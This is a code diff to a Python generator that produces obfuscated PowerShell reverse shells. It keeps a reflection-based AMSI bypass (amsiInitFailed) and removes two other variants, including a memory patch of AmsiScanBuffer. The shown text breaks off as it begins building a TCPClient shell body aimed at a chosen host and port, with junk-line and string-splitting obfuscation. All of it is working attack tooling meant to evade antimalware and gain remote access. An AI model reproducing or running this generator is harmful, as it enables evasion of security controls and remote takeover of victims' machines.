@@ -12,6 +12,7 @@ def split_string(s):
     return '+'.join([f"'{c}'" for c in s])
 
 def junk_code():
+    # Junk only, never used as shell variable!
     j = [
         f"${rand_name()} = {random.randint(1,100)}",
         f"# {rand_name()}_{random.randint(1000,9999)}",
@@ -21,48 +22,25 @@ def junk_code():
     ]
     return random.choice(j) + "\n"
 
-def amsi_bypass_variants(var):
-    # Each variant uses only var for randomized variable names!
-    variant1 = (
+def amsi_bypass_reflection(var):
+    # Reflection-based, classic, safest for VMs
+    return (
         f"${var['amsi_type']} = {split_string('AMSI')}\n"
         f"${var['amsi_field']} = [Ref].Assembly.GetType({split_string('System.Management.Automation.')}"
         f"+${var['amsi_type']}+{split_string('Utils')})\n"
         f"${var['amsi_failed']} = ${{{var['amsi_field']}}}.GetField(${{{var['amsi_type']}}}+{split_string('InitFailed')},'NonPublic,Static')\n"
         f"${var['amsi_failed']}.SetValue($null,$true)\n"
     )
-    variant2 = (
-        "[Ref].Assembly.GetType(" + split_string("System.Management.Automation.AmsiUtils") + ")."
-        "GetField(" + split_string("amsiInitFailed") + ", 'NonPublic,Static').SetValue($null, $true)\n"
-    )
-    variant3 = (
-        '$code = @"\n'
-        'using System;\n'
-        'using System.Runtime.InteropServices;\n'
-        'public class Win32 {\n'
-        '    [DllImport("kernel32")]\n'
-        '    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);\n'
-        '    [DllImport("kernel32")]\n'
-        '    public static extern IntPtr LoadLibrary(string name);\n'
-        '    [DllImport("kernel32")]\n'
-        '    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);\n'
-        '}\n'
-        '"@\n'
-        'Add-Type -TypeDefinition $code\n'
-        '$a = [Win32]::GetProcAddress([Win32]::LoadLibrary("amsi.dll"), "AmsiScanBuffer")\n'
-        '[Win32]::VirtualProtect($a, [System.UIntPtr]::op_Explicit(5), 0x40, [ref]0) | Out-Null\n'
-        '$p = [Byte[]](0xB8,0x57,0x00,0x07,0x80)\n'
-        '[System.Runtime.InteropServices.Marshal]::Copy($p, 0, $a, 5)\n'
-    )
-    return [variant1, variant2, variant3]
 
 def generate_obfuscated_ps(host="localhost", port=1443, write_file=True):
+    # Only use these variable names throughout the shell!
     var = {k: rand_name() for k in [
         "amsi_type", "amsi_field", "amsi_failed", "tcpclient", "stream", "bytes", "i", "data", "sendback",
         "sendback2", "sendbyte"
     ]}
-    amsi_bypass = amsi_bypass_variants(var)[0]
+    amsi_bypass = amsi_bypass_reflection(var)
 
-    # All variables used in the shell are assigned in var[]!
+    # Here: ONLY var[] keys used in all logic
     core_shell = (
         junk_code() +
         f"${var['tcpclient']} = New-Object {split_string('System.Net.Sockets.TCPClient')}('{host}',{port})\n" +
